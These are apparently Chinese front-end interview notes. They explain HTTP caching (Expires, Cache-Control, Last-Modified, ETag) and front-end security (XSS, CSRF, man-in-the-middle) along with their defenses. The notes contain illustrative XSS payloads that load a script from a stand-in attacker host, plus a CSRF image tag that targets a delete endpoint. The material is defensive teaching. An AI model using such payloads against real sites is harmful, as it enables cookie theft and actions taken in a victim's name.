## 说一说http缓存
[说一下 Http 缓存策略，有什么区别，分别解决了什么问题](https://github.com/lgwebdream/FE-Interview/issues/14)
浏览器每次向服务器发起请求时，先在本地缓存中查找结果及缓存标识，根据缓存标识来判断是否本地缓存。如果缓存有效，则使用本地缓存；否则向服务器发起请求并且携带缓存标识。根据是否发送http请求将缓存过程划分为：强缓存和协商缓存、并强缓存优先于协商缓存

强缓存（expire、cashe-control）：服务器通知浏览器一个缓存时间，在缓存时间内，下次请求，直接用缓存，不再时间内，执行比较缓存策略。
协商缓存（304）：让客户端和服务器之间能实现缓存文件是否更新的验证、提升缓存复用率。将缓存信息中的Etag和Last-Modifed通过请求发送给服务器,由服务器校验，返回304状态码时，浏览器直接使用缓存

http请求都是从第二次请求开始的
第一次请求资源时，服务器返回资源，并在response header中回传资源的缓存策略
第二次请求资源时，浏览器判断这些请求参数，击中强缓存就直接返回200，否则就把请求参数加到request header头中传给服务器，看是否击中协商缓存，击中则返回304，否则服务器会返回新的资源
[缓存流程](https://camo.githubusercontent.com/df822872ee2a8aef44c665f8fffd13c4cc4eb637bd8706ce4899e8eb72d2a431/687474703a2f2f696d672d7374617469632e796964656e6778756574616e672e636f6d2f77786170702f69737375652d696d672f7169642d382e706e67)

强缓存：
- 强缓存命中直接返回浏览器本地资源，在network中显示的是from memory或from disk
- 控制强缓存的字段有：Cash-control（http1.1）和Expires（http1.0）
- cash-control是一个相对时间，用于表达自上次请求正确的资源之后的多少秒的时间段内缓存有效
- Expires是一个绝对的时间，用以表达在这个时间点之前发起请求可以直接中浏览器中读取数据，而无需发起请求
- cash-control的优先级高于Expires，前者的出现是为了解决浏览器时间被手动更改导致缓存判断错误的问题
如果同时存在则使用cash-control

强缓存-Expires
- 该字段是服务器响应消息头字段，告诉浏览器在过期时间之前可以从浏览器缓存中存取数据
- Expires是http1.0的字段，表示缓存到期时间，是一个绝对的时间（当前时间+缓存时间）。在响应消息头中，设置这个字段以后，就可以告诉浏览器，在未过期之前不需要再次请求。
- 由于是绝对时间，用户可能会将客户端本地的时间进行修改，而导致浏览器判断缓存失效，重新请求该资源，即使不考虑修改，时差或者误差也可能造成客户端和服务端的时间不一致，致使缓存失效
- 优势特点
 - http 1.0的产物，可以在http1.0 和 http 1.1中使用，简单易用
 - 以时刻标识失效时间
- 缺点
 - 时间是由服务器发送的（utc），如何服务器时间和客户端时间存在不一致，可能会出现问题
 - 存在版本问题，到期以前的修改客户端是不可知的

强缓存-cashe-control
- 已知expires缺点之后，在http 1.1中，增加了一个字段cashe-control,该字段表示资源缓存的最大有效时间，在该时间内客户端不需要向服务器发送请求。
- 这两者的区别就是前者是绝对时间，后者是相对时间，cashe-control常用的字段值
  - max-age：最大有效时间
  - must-revalidate：如果超过了max-age时间，浏览器必须向服务器发送请求，验证资源是否还有效
  - no-cash：不使用强缓存，需要与服务器验证缓存是否新鲜
  - no-store：真正意义上的“不要缓存”，所有内容都不走缓存，包括强制和对比
  - public：所有内容都可以缓存（包括客户端、代理服务器，如cdn）
  - private：所有内容只有客户端可以缓存，代理服务器不能缓存，默认值
- cashe-control的优先级高于expires，为了兼容http1.0和http1.1，实际项目中两个字段都可以设置
- 该字段可以在请求头或者响应头中设置，可组合使用多种指令
  - 可缓存性
    - public：浏览器和代理服务器都可以缓存页面信息
    - private：default，代理服务器不可缓存，只能被单个用户缓存
    - no-cashe：浏览器和服务器都不应该缓存页面信息，但是仍可缓存，只是在缓存前需要向服务器确认资源是否被更改。可配合private，过期时间设置为过去时间
    - only-if-cashe：客户端只接受已缓存的响应
  - 到期
    - max-age=：缓存存储的最大周期，超过这个周期被认为过期
    - s-maxage：设置共享缓存，比如can会覆盖max-age和expires
    - max-stale=：客户端愿意接受一个已经过期的资源
    - min-fresh=：客户端希望在指定的时间内获取最新的响应
    - stale-while-revalidate=：客户端愿意接受陈旧的响应，并且在后台一并检查新的响应，时间代表客户端愿意接收陈旧响应的时间长度
    - stale-if-error：如新的检测失败，客户端愿意接收陈旧的响应，时间代表等待时间
  - 重新验证和重新加载
    - must-revalidate：如页面过期，则去服务器获取
    - proxy-revalidate：用于共享缓存
    - immutable：响应正文不随时间改变
  - 其他
    - no-store：绝对禁止缓存
    - no-transform：不得对资源进行转换和转变
- 优势特点
  - http1.1的产物，以时间间隔标识失效时间，解决expires服务器和客户端相对时间的问题
  - 比expires多了很多选项设置
- 劣势问题
 - 存在版本问题，到期之前的修改客户端是不可知的
举例：比如你和一个美国的面试官约定面试时间，明天9点钟（expires），从现在算起再过10小时（cash-control）

协商缓存
- 协商缓存的状态码由服务器决策返回200或304
- 当浏览器缓存失效的时候或者请求头中设置了不走强缓存，并且在请求头中设置了If-Modifed-since或者If-None-Match的时候，会将这两个属性值到服务端去验证是否命中协商缓存。如果命中协商缓存，会返回304状态，加载浏览器缓存，并且响应头会设置Etag或者Last-Modified
- 对比缓存在请求数上和没有缓存是一致的，但如果是304的话，返回的仅仅是一个状态码而已，并没有实际的文件内容，因此在响应体体积上的节省是它的优化点。
- 协商缓存有两组字段，控制协商缓存的字段有Last-Modified/If-Modified-since（http1.0）和Etag/If-None-Match（http1.1）
- last-Modified/If-Modified-since表示服务器的资源最后一次修改时间。Etag/If-None-Match表示的是服务器资源的唯一标识，只要资源变化，Etag就会重新生成
- Etag/If-None-Match的优先级高于last-Modified/If-Modified-since

协商缓存（Last-Modified/If-Modefined-since）
- 服务器通过Last-Modified告知客户端，资源最后一次被修改的时间，例如“Last-Modified:Mon, 10 Nov 2018 09:10:11 GMT”
- 浏览器将这个值一起记录在缓存数据库中
- 下一次请求相同资源时，浏览器从自己的缓存中找出“不确定是否过期”的缓存，因此在请求头中将上次的last-Modified的值写入到If-Modified-since字段
- 服务器会将Last-Modified和If-Modified值进行比较，如果相等，则表示未修改，返回304；反之则表示修改了，返回200状态码，并返回数据
- 优势特点
 - 不存在版本问题，每次请求都回去服务器进行校验，服务器对比最后修改时间，如果相同则返回304，反之返回200
- 劣势问题
 - 只要资源修改，无论内容是否发生实质性变化，都会将该资源返回客户端。例如周期性重写，这种情况下包含的数据实际上一样的。
 - 以时刻进行标识，无法识别1s内进行多次修改的情况。如果资源更新速度是秒以下单位，那么该缓存是不能被使用的，因为它的时间单位最低是秒
 - 某些服务器不能精准的得到文件的最后修改时间
 - 如果文件是通过服务器动态生成的，那么该方法的更新时间永远是生成时间，尽管文件可能没有变化，所以起不到缓存的作用

协商缓存（Etag/If-None-Match）
- 为了解决上述问题，出现了一组新的字段，Etag和If-None-Match
- Etag存储的是文件的特殊标识（一般是hash生成），服务器存储着Etag字段。之后的流程和Last-Modified一致。只是Last-Modified字段和它所表示的更新时间改变成了Etag和它所表示的文件hash，把If-Modified-Since变成If-None-Match，服务器同样进行比较，命中返回304，不命中返回200
- 浏览器在发起请求时，服务器会返回在Response header中返回请求资源的唯一标识，在下一次请求时会将上一次返回的Etag值赋值给If-None-Match，并添加在Request header中。服务器将浏览器传来的If-None-Match值和自己本地的资源E-tag进行对比，如果匹配则返回304通知浏览器读取本地缓存，否则返回200和更新后的资源
- Etag优先级高于Last-Modified
- 优势特点
 - 可以更加精准的判断资源是否被修改，可以识别1s内多次修改的情况
 - 不存在版本问题，每次修改都回去服务器进行校验
- 劣势问题
 - 计算Etag值需要性能损耗
 - 分布式服务器存储的情况下，计算Etag的算法如果不一样，会导致浏览器从一台服务器上获得页面内容后，到另外一台服务器上进行验证时出现Etag不匹配的情况 


 ## 前端安全
- XSS（跨站脚本攻击）：攻击者利用网站漏洞将代码注入到其他用户浏览器的攻击方式，常见类型：反射型（非持久性）、存储型（持久性）、DOM型
- CSRF（跨站请求伪造）：攻击者可以在用户不知情的情况下，窃用其身份在对应的网站进行操作
- 中间人攻击（MITM）：攻击这在通讯的两端分别创建独立的联系，在通讯中充当一个中间人的角色对数据进行监听、拦截甚至篡改。

1. XSS跨站脚本攻击
反射型（非持久性）
原理：攻击者通过在URL插入恶意代码，其他用户访问该恶意链接时，服务端在URL取出恶意代码后拼接至HTML中返回用户浏览器
要点：通过URL插入恶意代码、有服务端参与、需要用户访问特定链接
例如
```
攻击者诱导被害者打开链接 baidu.com?name=<script src="http://a.com/attack.js"/>。

被攻击网站服务器收到请求后，未经处理直接将 URL 的 name 字段直接拼接至前端模板中，并返回数据。

被害者在不知情的情况下，执行了攻击者注入的脚本（可以通过这个获取对方的 Cookie 等）。
```

存储型（持久性）
原理：攻击者将注入型脚本提交至被攻击网站数据库中，当其他用户浏览器请求数据时，注入脚本返回并执行
要点：恶意代码存储在目标网站的服务器上、有服务端参与、只要用户访问被注入恶意脚本的页面时，就会被攻击
例如
```
攻击者在目标网站留言板中提交了<script src="http://a.com/attack.js"/>。

目标网站服务端未经转义存储了恶意代码，前端请求到数据后直接通过 innerHTML 渲染到页面中。

其他用户在访问该留言板时，会自动执行攻击者注入脚本。
```

DOM型
原理：攻击者通过URL插入恶意代码，客户端脚本取出URL中的恶意代码并执行
要点：只在客户端发生
例如
```
攻击者诱导被害者打开链接 baidu.com?name=<script src="http://a.com/attack.js"/>。

被攻击网站前端取出 URL 的 name 字段后未经转义直接通过 innerHTML 渲染到页面中。

被害者在不知情的情况下，执行了攻击者注入的脚本。
```

防范XSS
- 对于外部传入的内容进行充分转译
- 开启CSP（Content Security Policy,内容安全策略），规定客户端哪些资源可以加载和执行，降低XSS风险
- 设置Cookie httpOnly，禁止js读取cookie防止被窃取

2. CSRF（跨站请求伪造）
原理：攻击者诱导受害者进入第三方网站，在第三方网站中向攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的身份凭证，达到冒充用户对被攻击网站执行某项操作的目的
要点：利用浏览器发送http请求时会自动带上cookie的原理，冒充受害者身份；攻击一般发生在第三方网站上；攻击者只能冒用受害者身份凭证，而不能获取；跨站请求的方式有多种方式，常见的由图片url、超链接、form提交
例如
```
攻击者在第三方网站上放置一个如下的 img
<img src="http://baidu.com/article/delete" />

受害者访问该页面后（前提：受害者在 baidu.com 登录过且产生了 Cookie 信息），浏览器会自动发起这个请求，baidu.com 就会收到包含受害者身份凭证的一次跨域请求。

若目标网站没有任何防范措施，那攻击者就能冒充受害者完成这一次请求操作。
```

防范
- 使用CSRF token验证用户身份
  - 原理：服务端生成CSRF token（通常存在Session中），用户提交请求时携带上token，服务端验证token是否有效
  - 优点：能比较有效的预防csrf（前提是没有xss漏洞泄漏token）
  - 缺点：大型网站中session存储会增加服务器压力，且若使用分布式集群还需要一个公共存储空间存储token，否则用户可能请求到不同的服务器上导致用户凭证失效；有一定的工作量
- 双重cookie验证
  - 利用攻击者不能获取到cookie的特点，在URL参数或者自定义请求头上带上cookie数据，服务器再验证该数据是否与cookie一致
  - 优点：不用使用session，不会给服务器压力
- 设置cookie的sameSite属性可以用来限制第三方，可选值有Strict、Lax、None
  - Strict：完全禁止第三方cookie
  - Lax：只允许链接、预加载请求和get表单的场景下发送第三方Cookie
  - None：关闭sameSit属性
- 设置白名单，只允许安全域名请求
- 增加验证码验证

中间人攻击
原理：中间人攻击是一种通过各种技术手段入侵两台设备通信的网络攻击方法，成功的中间人攻击主要有两个阶段：拦截和解密
拦截：攻击者需要用户在到达目标设备之前拦截并通过攻击者的网络。分为被动攻击和主动攻击
常见的被动攻击（最简单）的方法，攻击者向公众提供免费的恶意wifi热点，一旦有受害者连接了该热点，攻击者就能完全了解其所有的在线数据交换。
常见的主动攻击
1. ARP欺骗，攻击这利用ARP的漏洞，通过冒充网关或其他主机，使得到达网关或其他主机的流量通过攻击者主机进行转发
2. DNS欺骗，攻击者冒充域名服务器，将受害者查询的ip地址转发到攻击者ip地址
解密：拦截后，若连接使用https协议即使用SSL/TSL进行加密，此时还需要其他手段进行解密用户数据

SSL劫持（伪造证书）：攻击者在TSL握手期间拦截到服务器返回的公钥后，将服务器的公钥替换成自己的公钥返回给客户端，这样攻击者就能用自己的私钥去解密用户数据，也能用服务器的公钥解密服务器的数据。因为是伪造证书，在客户端校验证书的过程中会提示证书错误，如果用户仍选择继续操作，此时中间人便能获取到与服务器的通讯数据

SSL剥离：攻击者拦截到用户到服务器的请求后，攻击者继续和服务器保持https连接，并与用户降级为不安全的http连接
服务器可以通过开启HSTS（HTTP Strict Transport Security）策略告诉浏览器必须使用https连接。但是有个缺点就是首次访问时因还未收到HSTS响应头而不受保护

中间人攻击防范
- 对于开发者来说，支持HTTPS、开启HSTS
- 对于用户来说，尽可能使用https链接、避免连接不知名的wifi热点、不忽略不安全的浏览器通知、公共网络不进行涉及敏感信息的交互、用可信的第三方ca厂商、不下载来源不明的证书。